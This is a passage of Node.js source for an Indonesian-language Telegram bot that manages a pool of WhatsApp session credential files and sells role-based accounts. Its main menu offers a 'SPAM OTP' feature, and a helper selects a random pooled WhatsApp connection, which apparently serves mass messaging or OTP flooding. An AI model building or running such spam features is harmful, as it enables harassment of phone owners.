    /*if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
    for (const file of vipFiles) {
  const sessionName = path.basename(file, '.json');
  const jsonFile = path.join(vipDir, file);        // vip/628xxx.json
  const sessionFolder = path.join(vipDir, sessionName); // vip/628xxx/

  if (activeConnections[sessionName]) {
    console.log(`[SKIP] VIP ${sessionName} already active.`);
    continue;
  }

  if (!fs.existsSync(sessionFolder)) {
    fs.mkdirSync(sessionFolder, { recursive: true });
    fs.copyFileSync(jsonFile, path.join(sessionFolder, 'creds.json'));
    console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
  }

  try {
    console.log(`[START] Connecting VIP: ${sessionName}`);
    await connectSession(sessionFolder, sessionName, 100, () => {
      // Callback kalau session mati → hapus json asli juga
      if (fs.existsSync(jsonFile)) {
        fs.rmSync(jsonFile, { force: true });
        console.log(`[] VIP json dihapus: ${file}`);
      }
    });
  } catch (err) {
    console.error(`[ERROR] VIP ${sessionName}:`, err.message);
  }
}*/
/*

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);

  for (const file of vipFiles) {
    const sessionName = path.basename(file, '.json');

    if (activeConnections[sessionName]) {
      console.log(`[SKIP] VIP ${sessionName} already active.`);
      continue;
    }

    // Buat folder sementara vip/628xxx/ lalu taruh creds.json di sana
    const sessionFolder = path.join(vipDir, sessionName);
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      fs.copyFileSync(
        path.join(vipDir, file),         // vip/628xxx.json
        path.join(sessionFolder, 'creds.json') // vip/628xxx/creds.json
      );
      console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
    }

    try {
      console.log(`[START] Connecting VIP: ${sessionName}`);
      await connectSession(vipDir, sessionName);
    } catch (err) {
      console.error(`[ERROR] VIP ${sessionName}:`, err.message);
    }
  }
}
await sleep(20000);*/
  // 2. Scan User Folders (Logika Anda yang disederhanakan)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        //  Cek apakah session sudah aktif
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
            
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
    
}
function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}
function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}
   function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => ` ${u.username} |  ${u.role || 'member'} |  ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
const REQUIRED_CHANNELS = [CHANNEL_1, CHANNEL_2].filter(Boolean);
const FREE_DURATION_DAYS = 5;
const MENU_VIDEO_URL = "https://files.catbox.moe/aindwd.mp4";
const pendingTelegramInput = new Map();
const menuAnimations = new Map();

// ─── Grup Admin untuk Notifikasi Create Account ───
const ADMIN_GROUP_ID = "-1004340267673"; // 🔴 GANTI DENGAN ID GROUP ADMIN KAMU

// ─── Map untuk menyimpan data request create account sementara ───
const pendingCreateRequests = new Map();

const ROLE_NAMES = ["member", "vip", "tukang_bubur", "reseller", "admin", "partner", "developers", "partner_pribadi", "tangan_kiri", "tangan_kanan", "ceo_utama", "moderator", "forius_utama", "executorius", "staff", "owner", "owner_utama"];

// ========== DURASI UNTUK CREATE ACCOUNT ==========
const DURATION_OPTIONS = [
    { label: '1 Hari', value: 1, style: 'primary' },
    { label: '3 Hari', value: 3, style: 'primary' },
    { label: '7 Hari', value: 7, style: 'primary' },
    { label: '30 Hari', value: 30, style: 'success' },
    { label: '90 Hari', value: 90, style: 'success' },
    { label: '180 Hari', value: 180, style: 'success' },
    { label: '365 Hari', value: 365, style: 'primary' },
    { label: '♾️ PERMANEN', value: 0, style: 'danger' },
    { label: '✏️ CUSTOM DAYS', value: -1, style: 'primary' }
];

const CREATE_UI_EMOJI = Object.freeze({
  spark: '6269243378332864932',
  shield: '6046530293035176435',
  user: '5341715473882955310',
  wallet: '6098166408502320493',
  check: '5206607081334906820',
  rocket: '5411430859045626151',
  clock: '6098230596788556786',
  camera: '5402355073458123173',
  lock: '6046530293035176435'
});

function createUiEmoji(id, fallback) {
  return HTML.customEmoji(id, fallback);
}

function createAccountRich(title, body, buttons = []) {
  return [
    `<blockquote><b>${createUiEmoji(CREATE_UI_EMOJI.spark, '✨')} ${escapeHtml(title)}</b></blockquote>`,
    body,
    `<hr/>`,
    `<p>${createUiEmoji(CREATE_UI_EMOJI.shield, '🛡️')} <i>Mclaren Project • Secure Create System</i></p>`
  ].join('\n');
}

const createAccountLocks = new Map();
let createAccountDbQueue = Promise.resolve();

function saveDatabaseAtomicCreate(data) {
  const tempPath = `${DB_PATH}.create.tmp`;
  fs.writeFileSync(tempPath, JSON.stringify(data, null, 2), 'utf8');
  fs.renameSync(tempPath, DB_PATH);
}

async function withCreateAccountDbLock(task) {
  const previous = createAccountDbQueue;
  let release;
  createAccountDbQueue = new Promise(resolve => { release = resolve; });
  await previous;
  try {
    return await task();
  } finally {
    release();
  }
}

async function withCreateAccountLock(key, task) {
  const lockKey = String(key);
  const previous = createAccountLocks.get(lockKey) || Promise.resolve();
  let release;
  const current = new Promise(resolve => { release = resolve; });
  createAccountLocks.set(lockKey, previous.then(() => current));
  await previous;
  try {
    return await task();
  } finally {
    release();
    const queued = createAccountLocks.get(lockKey);
    if (queued) createAccountLocks.delete(lockKey);
  }
}

function telegramIsOwner(id) {
  const cfg = loadTelegramConfig();
  return Array.isArray(cfg.ownerList) && cfg.ownerList.includes(Number(id));
}

function telegramCanCreate(id) {
  const cfg = loadTelegramConfig();
  return telegramIsOwner(id) || (Array.isArray(cfg.userList) && cfg.userList.includes(Number(id)));
}

function getCreateApproverList() {
  const cfg = loadTelegramConfig();
  return Array.isArray(cfg.createApproverList) ? cfg.createApproverList : [];
}

function telegramCanRequestCreate(id) {
  return Number.isFinite(Number(id)) && Number(id) > 0;
}

function telegramCanApproveCreate(id) {
  const userId = Number(id);
  return telegramIsOwner(userId) || getCreateApproverList().includes(userId);
}

function canApprovePrivilegedRole(id, role) {
  if (!['owner', 'owner_utama'].includes(String(role).toLowerCase())) return telegramCanApproveCreate(id);
  return telegramIsOwner(id);
}

function getChannelUrl(channel) {
  if (!channel) return null;
  return channel.startsWith("@") ? `https://t.me/${channel.slice(1)}` : `https://t.me/${channel}`;
}

async function checkJoinedChannels(userId, channels = REQUIRED_CHANNELS) {
  if (channels.length < 2) {
    return { ok: false, configured: false, missing: [], message: "Channel kedua belum dikonfigurasi. Set CHANNEL_2 terlebih dahulu." };
  }

  const missing = [];
  for (const channel of channels) {
    try {
      const member = await bot.getChatMember(channel, Number(userId));
      if (!["member", "administrator", "creator"].includes(member.status)) missing.push(channel);
    } catch (err) {
      console.error(`[TELEGRAM] Gagal cek ${channel}:`, err.message);
      return { ok: false, configured: true, missing: [channel], error: true, message: `Bot tidak bisa memverifikasi ${channel}. Pastikan bot menjadi admin channel.` };
    }
  }
  return { ok: missing.length === 0, configured: true, missing };
}

function randomButtonStyle(preferred) {
  return preferred || "primary";
}

function buildMainKeyboard(isOwner, canCreate) {
  const keyboard = {
    inline_keyboard: [
      // ===== 🆕 BUTTON SETORAN (PANJANG, PALING ATAS, AKSES SEMUA) =====
      [
        { text: "𝗦𝗘𝗧𝗢𝗥𝗔𝗡¿𝗣𝗔𝗚𝗘", callback_data: "stn_menu", style: "success", icon_custom_emoji_id: "5350295774863311434" }
      ],
      [
        { text: "𝗖𝗥𝗘𝗔𝗧𝗘𖡭𝗙𝗥𝗘𝗘", callback_data: "create_free", style: "success", icon_custom_emoji_id: "5348412779596365405" }
      ],
      [
        { text: "𝗧𝗔𝗠𝗕𝗔𝗛𖢃𝗗𝗨𝗥𝗔𝗦𝗜", callback_data: "set_expire", style: "primary", icon_custom_emoji_id: "5350356823528455446" },
        { text: "𝗖𝗘𝗞 𝗨𝗦𝗘𝗥 𖡹 𝗛𝗔𝗣𝗨𝗦 𝗔𝗞𝗨𝗡", callback_data: "delete_user", style: "danger", icon_custom_emoji_id: "5348407054404958928" }
      ],
      [
        { text: "𝗥𝗢𝗟𝗘☓𝗠𝗘𝗡𝗨", callback_data: "role_menu", style: "primary", icon_custom_emoji_id: "5893382531037794941" },
        { text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟𝗦𖥓", callback_data: "channels", style: "primary", icon_custom_emoji_id: "5350572310627632617" }
      ],
      // ===== TOMBOL SPAM OTP =====
      [
        { text: "𝗦𝗣𝗔𝗠巛𝗢𝗧𝗣", callback_data: "spam_start", style: "success", icon_custom_emoji_id: "5350718631573471460" }
      ],
      // ===== 🆕 TOMBOL MENU LAYANAN (accessible semua) =====
      [
        { text: "𝗟𝗔𝗬𝗔𝗡𝗔𝗡⚛︎𝗧𝗢𝗞𝗢", callback_data: "svc_menu", style: "success", icon_custom_emoji_id: "5350295774863311434" }
      ]
    ]
  };

  // ===== TAMBAHKAN TOMBOL CEK BANNED VIP (hanya owner) =====
  if (isOwner) {
    keyboard.inline_keyboard.push([
      { text: "𝗖𝗘𝗞〄𝗕𝗔𝗡", callback_data: "check_banned_vip", style: "primary", icon_custom_emoji_id: "5350725709679584478" }
    ]);
  }

  return keyboard;
}

// ═══════════════════════════════════════════════════════════════════════
// 📌 TEXT RICH PANEL FUNCTIONS — v10.0 PREMIUM EDITION
// Full RichMessage: blockquote, table, hr, ol, ul, footer
// ═══════════════════════════════════════════════════════════════════════

// ─── ESCAPE HTML ────────────────────────────────────────────────────────
function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// ─── CUSTOM EMOJI HELPER ────────────────────────────────────────────────
function cemoji(id, fallback) {
  return `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
}

// Premium Emoji IDs (bisa dipakai di semua panel)
const PREMIUM_EMOJI = {
  crown:      "5341715473882955310",
  star:       "5375338737028841420",
  rocket:     "5402186569006210455",
  gem:        "5341715473882955310",
  money:      "6098166408502320493",
  check:      "5206607081334906820",
  cross:      "5210952531676504517",
  warning:    "5447644880824181073",
  info:       "5334544901428229844",
  clock:      "5348090777308251395",
  bell:       "6098230596788556786",
  fire:       "5447644880824181073",
  shield:     "5447644880824181073",
  store:      "5350295774863311434",
  user:       "5210956306952758910",
  group:      "5210956306952758910",
  receipt:    "5210956306952758910",
  services:   "5341715473882955310",
  next:       "5206607081334906820",
  sparkle:    "5375338737028841420",
  trophy:     "5341715473882955310",
  chart:      "5350295774863311434",
};

// ─── BUILD TEXT RICH (dari blocks) ──────────────────────────────────────
function buildTextRich(blocks) {
  let html = '';

  for (const block of blocks) {
    if (!block) continue;

    if (block.type === 'header') {
      html += `<blockquote><b>${block.emoji || '📊'} ${escapeHtml(block.text)}</b></blockquote>\n`;
    } else if (block.type === 'paragraph') {
      html += `<p>${escapeHtml(block.text)}</p>\n`;
    } else if (block.type === 'paragraphHtml') {
      // raw HTML paragraph (bukan escape)
      html += `<p>${block.html}</p>\n`;
    } else if (block.type === 'divider') {
      html += `<hr/>\n`;
    } else if (block.type === 'quote') {
      html += `<blockquote>${block.html || escapeHtml(block.text)}</blockquote>\n`;
    } else if (block.type === 'table') {
      const rows = block.rows || [];
      html += `<table bordered striped compact>\n`;
      if (rows.length) {
        const [head, ...body] = rows;
        html += `<tr><th>${escapeHtml(head[0] ?? '')}</th><th>${escapeHtml(head[1] ?? '')}</th></tr>\n`;
        for (const row of body) {
          html += `<tr><td>${escapeHtml(row[0] ?? '')}</td><td>${escapeHtml(row[1] ?? '')}</td></tr>\n`;
        }
      }
      html += `</table>\n`;
    } else if (block.type === 'list') {
      html += `<ul>\n`;
      for (const item of (block.items || [])) {
        html += `<li>${block.raw ? item : escapeHtml(item)}</li>\n`;
      }
      html += `</ul>\n`;
    } else if (block.type === 'ordered') {
      html += `<ol>\n`;
      for (const item of (block.items || [])) {
        html += `<li>${block.raw ? item : escapeHtml(item)}</li>\n`;
      }
      html += `</ol>\n`;
    } else if (block.type === 'footer') {
      html += `<footer>${block.raw ? block.text : escapeHtml(block.text)}</footer>\n`;
    }
  }

  return html.trim();
}

// ─── RICH PANEL ─────────────────────────────────────────────────────────
function richPanel(title, rows = [], footer = "Choose an option below.") {
  const table = (data) => {
    let out = `<table bordered striped compact>\n`;
    out += `<tr><th>Information</th><th>Detail</th></tr>\n`;
    for (const [a, b] of data) {
      out += `<tr><td>${escapeHtml(a)}</td><td>${escapeHtml(b)}</td></tr>\n`;
    }
    out += `</table>`;
    return out;
  };

  return [
    `<blockquote><b>📡 ᯓ 𝙈𝘾𝙇𝘼𝙍𝙀𝙉 ˣ 𝙈𝘿</b></blockquote>`,
    `<p>Welcome ≋ <b>𝙈𝘾𝙇𝘼𝙍𝙀𝙉 ˣ</b> to ≋ <b>𝙈𝘾𝙇𝘼𝙍𝙀𝙉 ˣ MD</b></p>`,
    `<hr/>`,
    `<blockquote><b>👑 ${escapeHtml(title)}</b></blockquote>`,
    table(rows),
    `<hr/>`,
    `<p><b>Select Menu Below</b></p>`,
    `<footer>© ≋ <b>𝙈𝘾𝙇𝘼𝙍𝙀𝙉 ˣ MD</b> • 9</footer>`
  ].join('\n');
}

// ─── ERROR PANEL ────────────────────────────────────────────────────────
function createErrorPanel(message) {
  return [
    `<blockquote><b>🚨 ❌ ERROR</b></blockquote>`,
    `<p>${escapeHtml(message)}</p>`,
    `<hr/>`,
    `<footer>Please try again or contact support.</footer>`
  ].join('\n');
}

// ─── INFO PANEL ─────────────────────────────────────────────────────────
function createSimplePanel(message) {
  return [
    `<blockquote><b>📌 ℹ️ INFORMATION</b></blockquote>`,
    `<p>${escapeHtml(message)}</p>`,
    `<hr/>`,
    `<footer>For more info, use /help</footer>`
  ].join('\n');
}

// ─── SUCCESS PANEL ──────────────────────────────────────────────────────
function createSuccessPanel(title, rows = []) {
  let table = `<table bordered striped compact><tr><th>Information</th><th>Detail</th></tr>`;
  for (const [a, b] of rows) {
    table += `<tr><td>${escapeHtml(a)}</td><td>${escapeHtml(b)}</td></tr>`;
  }
  table += `</table>`;
  return [
    `<blockquote><b>🎉 ✅ ${escapeHtml(title)}</b></blockquote>`,
    table,
    `<hr/>`,
    `<footer>Action completed successfully!</footer>`
  ].join('\n');
}

const processStartTime = Date.now();

// ═══════════════════════════════════════════════════════════════════════
// 🌟 MAIN MENU TEXT — SUPER PREMIUM WELCOME
// ═══════════════════════════════════════════════════════════════════════
function mainMenuText(name, id, username = "-") {
  const safeName = escapeHtml(String(name || "User").replace(/[<>]/g, ""));
  const safeUsername = username && username !== "-"
    ? `@${escapeHtml(String(username).replace(/^@/, ""))}`
    : "-";

  const owner = telegramIsOwner(Number(id));
  const canCreate = telegramCanCreate(Number(id));

  // Runtime
  const sec = Math.floor((Date.now() - processStartTime) / 1000);
  const d = Math.floor(sec / 86400);
  const h = Math.floor((sec % 86400) / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const ss = sec % 60;
  const runtime = `${d}d ${h}h ${m}m ${ss}s`;

  // Waktu WIB
  const now = new Date();
  const wibTime = now.toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit'
  });

  // Role display
  let statusLabel = "👤 MEMBER";
  if (owner) statusLabel = "👑 OWNER";
  else if (canCreate) statusLabel = "🛠️ STAFF";
  else statusLabel = "👤 MEMBER";

  const botRows = [
    ["🤖 Version", "v10.0 Premium"],
    ["📚 Library", "node-telegram-bot-api"],
    ["💻 Language", "JavaScript (Node.js)"],
    ["⏱️ Runtime", runtime],
    ["🕐 VPS Time", wibTime]
  ];

  const userRows = [
    ["👤 Nickname", safeName],
    ["🏷️ Username", safeUsername],
    ["🆔 User ID", String(id)],
    ["👑 Status", statusLabel],
    ["✅ Can Create", canCreate ? "YES ✅" : "NO ❌"]
  ];

  const buildTable = (data) => {
    let out = `<table bordered striped compact>\n`;
    out += `<tr><th>Information</th><th>Detail</th></tr>\n`;
    for (const [a, b] of data) {
      out += `<tr><td>${escapeHtml(a)}</td><td>${escapeHtml(b)}</td></tr>\n`;
    }
    return out + `</table>`;
  };

  return [
    `<blockquote><b>🌟 ≋ 𝙈𝘾𝙇𝘼𝙍𝙀𝙉 ˣ 𝙈𝘿 — PREMIUM BOT ≋ 🌟</b></blockquote>`,
    `<p>🎉 <b>Selamat datang kembali</b>, <b>${safeName}</b>! mau create akun /create aja ya! 👋</p>`,
    `<p>Anda login sebagai <b>${statusLabel}</b> di <b>Mclaren Project</b>.</p>`,
    `<hr/>`,
    `<blockquote><b>🤖 BOT INFORMATION</b></blockquote>`,
    buildTable(botRows),
    `<blockquote><b>👤 USER INFORMATION</b></blockquote>`,
    buildTable(userRows),
    `<hr/>`,
    `<blockquote><b>📋 PANDUAN SINGKAT</b></blockquote>`,
    `<ol>`,
    `<li>Pilih menu di bawah untuk mulai menggunakan bot.</li>`,
    `<li><b>Buy Access Role</b> — beli akses role baru.</li>`,
    `<li><b>Up Access Role</b> — upgrade role kamu.</li>`,
    `<li><b>Menu Layanan</b> — semua layanan di 1 tempat.</li>`,
    `<li><b>Create Free</b> — buat akun gratis (kalau tersedia).</li>`,
    `<li>Join channel resmi untuk update terbaru.</li>`,
    `</ol>`,
    `<hr/>`,
    `<blockquote><b>💎 TENTANG MCLAREN PROJECT</b></blockquote>`,
    `<p><b>Mclaren Project</b> adalah platform premium dengan:</p>`,
    `<ul>`,
    `<li>🔐 Sistem keamanan berlapis</li>`,
    `<li>⚡ Real-time transaction</li>`,
    `<li>💎 Verified testimonial</li>`,
    `<li>🚀 Auto-verification system</li>`,
    `<li>👑 Premium role & group private</li>`,
    `</ul>`,
    `<hr/>`,
    `<p>👇 <b>Silakan pilih menu di bawah:</b></p>`,
    `<footer>© ≋ <b>𝙈𝘾𝙇𝘼𝙍𝙀𝙉 ˣ 𝙈𝘿</b> • v10.0 • Trusted Since 2026</footer>`
  ].join('\n');
}

// ─── PANEL FOR ACTION ──────────────────────────────────────────────────
function panelForAction(title, rows, footer = "Use the format above to continue.") {
  return richPanel(title, rows, footer);
}

// ─── SEND MENU VIDEO ──────────────────────────────────────────────────
async function sendMenuVideo(chatId, caption, replyMarkup) {
  try {
    await deletePreviousRichMenu(chatId);
  } catch (_) {}
  try {
    await runRichLoading(chatId);
  } catch (_) {}

  let sent = null;
  try {
    sent = await bot.sendRichMessage({
      type: "video",
      chatId,
      media: MENU_VIDEO_URL,
      options: {
        caption,
        parse_mode: "HTML",
        reply_markup: replyMarkup,
        supports_streaming: true
      }
    });
  } catch (e) {
    console.error('[MAIN MENU] video send failed:', e.message);
    // Fallback: kirim teks RichMessage aja
    try {
      sent = await bot.sendRichMessage(chatId, caption, {
        parse_mode: 'HTML',
        reply_markup: replyMarkup
      });
    } catch (e2) {
      console.error('[MAIN MENU] rich text fallback failed:', e2.message);
    }
  }

  if (sent?.message_id) __lastRichMenu.set(Number(chatId), sent);
  return sent;
}

// ─── SEND MAIN MENU ──────────────────────────────────────────────────
async function sendMainMenu(msgOrId) {
  const id = typeof msgOrId === "object" ? msgOrId.from.id : Number(msgOrId);
  const name = typeof msgOrId === "object"
    ? (msgOrId.from.first_name || msgOrId.from.username || "User")
    : "User";
  const isOwner = telegramIsOwner(id);
  const canCreate = telegramCanCreate(id);
  const username = typeof msgOrId === "object" ? (msgOrId.from.username || "-") : "-";

  return sendMenuVideo(
    id,
    mainMenuText(name, id, username),
    buildMainKeyboard(isOwner, canCreate)
  );
}

async function sendJoinGate(id, freeMode = false) {
  const channels = REQUIRED_CHANNELS;

  const rows = channels.map((channel, i) => [
    { text: `📢 JOIN CHANEL ${i + 1}`, url: getChannelUrl(channel) }
  ]);
  rows.push([
    { text: "✅ CEK JOIN", callback_data: freeMode ? "check_free_join" : "check_join" }
  ]);

  const caption = richPanel(
    freeMode ? "🎁 AKSES CHANEL — CREATE FREE" : "🔑 AKSES CHANEL",
    [
      ["📌 Mode", freeMode ? "🎁 CREATE FREE" : "🔓 AKSES"],
      ["📋 Syarat", "JOIN 2 CHANEL"],
      ["⏳ Status", "⏳ MENUNGGU JOIN"],
      ["💡 Tips", "Join kedua channel, lalu tekan CEK JOIN"]
    ],
    "🔄 Klik tombol di bawah untuk bergabung ke channel."
  );

  return sendMenuVideo(id, caption, { inline_keyboard: rows });
}

bot.onText(/^\/?(start|menu)\b/i, async (msg) => {
  return sendMainMenu(msg);
});


// ============================================================
// 👑 OWNER ROLE UPGRADE WIZARD
// /upgrade -> pilih username -> konfirmasi role sekarang -> pilih role target
// ============================================================
const upgradeWizardState = new Map();
const UPGRADE_ROLE_ORDER = [
  'member', 'vip', 'reseller', 'tukang_bubur', 'admin', 'partner',
  'partner_pribadi', 'tangan_kiri', 'tangan_kanan', 'developers',
  'ceo_utama', 'moderator', 'forius_utama', 'executorius', 'staff',
  'owner', 'owner_utama'
];
const UPGRADE_USERS_PER_PAGE = 8;

const UPGRADE_EMOJI = {
  crown: '5402186569006210455',
  user: '5341715473882955310',
  shield: '5447644880824181073',
  check: '5206607081334906820',
  money: '6098166408502320493',
  warning: '5447644880824181073',
  next: '5206607081334906820',
};

function upgradeCe(id, fallback) {
  return `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
}

function upgradeRoleLabel(role) {
  const labels = {
    member: '👤 MEMBER',
    vip: '⭐ VIP',
    reseller: '💰 RESELLER',
    tukang_bubur: '🍲 TUKANG BUBUR',
    admin: '🔧 ADMIN',
    partner: '🤝 PARTNER',
    partner_pribadi: '🤝 PARTNER PRIBADI',
    tangan_kiri: '🤝 TANGAN KIRI',
    tangan_kanan: '🤝 TANGAN KANAN',
    developers: '💻 DEVELOPERS',
    ceo_utama: '💼 CEO UTAMA',
    moderator: '🛡️ MODERATOR',
    forius_utama: '🔥 FORIUS UTAMA',
    executorius: '⚡ EXECUTORIUS',
    staff: '🛠️ STAFF',
    owner: '👑 OWNER',
    owner_utama: '👑 OWNER UTAMA',
  };
  return labels[role] || `👤 ${String(role || 'member').toUpperCase()}`;
}

function upgradeRichPanel(title, rows, footer = '') {
  const body = rows.map(([label, value]) =>
    `<blockquote><b>${escapeHtml(label)}</b> : ${value}</blockquote>`
  ).join('\n');
  return [
    `<blockquote><b>${title}</b></blockquote>`,
    body,
    footer ? `<blockquote><i>${footer}</i></blockquote>` : ''
  ].filter(Boolean).join('\n');
}

function upgradeUserDisplay(user) {
  const username = String(user?.username || 'unknown');
  return username.length > 24 ? `${username.slice(0, 21)}...` : username;
}

function upgradeRoleIndex(role) {
  return UPGRADE_ROLE_ORDER.indexOf(String(role || 'member').toLowerCase());
}

function getUpgradeTargetRoles(currentRole) {
  const currentIndex = upgradeRoleIndex(currentRole);
  if (currentIndex < 0) return [];
  return UPGRADE_ROLE_ORDER.slice(currentIndex + 1);
}

function upgradeRoleButton(role) {
  const label = upgradeRoleLabel(role).replace(/^[^A-Z0-9]+/i, '').trim();
  const style = role === 'owner_utama' || role === 'owner' ? 'danger'
    : role === 'staff' || role === 'executorius' ? 'success'
      : 'primary';
  return {
    text: `${upgradeRoleLabel(role)} ↑`,
    callback_data: `upg_to_${role}`,
    style,
    icon_custom_emoji_id: UPGRADE_EMOJI.next,
  };
}

async function showUpgradeUserPage(chatId, messageId, ownerId, page = 1) {
  if (!telegramIsOwner(ownerId)) return false;

  const db = loadDatabase();
  const users = db.filter(user => user && user.username);
  const totalPages = Math.max(1, Math.ceil(users.length / UPGRADE_USERS_PER_PAGE));
  const safePage = Math.min(Math.max(Number(page) || 1, 1), totalPages);
  const start = (safePage - 1) * UPGRADE_USERS_PER_PAGE;
  const pageUsers = users.slice(start, start + UPGRADE_USERS_PER_PAGE);

  upgradeWizardState.set(ownerId, {
    step: 'SELECT_USER',
    page: safePage,
    users: users.map(user => user.username),
  });

  const rows = pageUsers.map(user => {
    const index = db.indexOf(user);
    const role = String(user.role || 'member').toLowerCase();
    return [{
      text: `${upgradeRoleLabel(role)}  •  @${upgradeUserDisplay(user)}`,
      callback_data: `upg_user_${index}`,
      style: role === 'owner_utama' || role === 'owner' ? 'danger' : 'primary',
      icon_custom_emoji_id: UPGRADE_EMOJI.user,
    }];
  });

  const nav = [];
  if (safePage > 1) nav.push({ text: '⬅️ SEBELUMNYA', callback_data: `upg_page_${safePage - 1}`, style: 'primary' });
  if (safePage < totalPages) nav.push({ text: '➡️ SELANJUTNYA', callback_data: `upg_page_${safePage + 1}`, style: 'primary' });
  if (nav.length) rows.push(nav);
  rows.push([{ text: '❌ BATAL', callback_data: 'upg_cancel', style: 'danger' }]);

  const caption = [
    `<blockquote><b>${upgradeCe(UPGRADE_EMOJI.crown, '👑')} OWNER ROLE UPGRADE</b></blockquote>`,
    `<blockquote>${upgradeCe(UPGRADE_EMOJI.shield, '🛡️')} <b>DATABASE USER SELECTION</b></blockquote>`,
    `<blockquote>Silakan pilih <b>username</b> yang ingin diproses.</blockquote>`,
    `<blockquote>📊 <b>Page:</b> ${safePage}/${totalPages}  •  👥 <b>Total:</b> ${users.length}</blockquote>`,
    `<blockquote><i>Hanya owner yang dapat menjalankan wizard ini.</i></blockquote>`,
  ].join('\n');

  const options = { parse_mode: 'HTML', reply_markup: { inline_keyboard: rows } };
  if (messageId) {
    await bot.editRichMessage(caption, { chat_id: chatId, message_id: messageId, ...options });
  } else {
    await bot.sendRichMessage(chatId, caption, options);
  }
  return true;
}

function upgradeCurrentRoleKeyboard(role) {
  return {
    inline_keyboard: [
      [{
        text: `${upgradeRoleLabel(role)}  •  ROLE SEKARANG`,
        callback_data: `upg_current_${role}`,
        style: 'primary',
